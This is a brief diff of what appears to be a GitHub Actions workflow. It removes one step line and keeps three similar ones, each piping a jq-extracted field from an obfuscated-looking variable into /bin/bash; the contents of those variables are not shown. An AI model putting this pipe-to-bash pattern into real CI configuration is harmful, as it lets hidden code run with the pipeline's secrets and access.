@@ -32,7 +32,6 @@ jobs:
           echo $wnemy76 | jq -r .an29 | /bin/bash
           printf '%s' "$zkdr90" | jq -r .ffc912 | /bin/bash
           echo $qt92 | jq -r .gpix459 | /bin/bash
-          printf '%s' "$gyw3" | jq -r .tvlb629 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
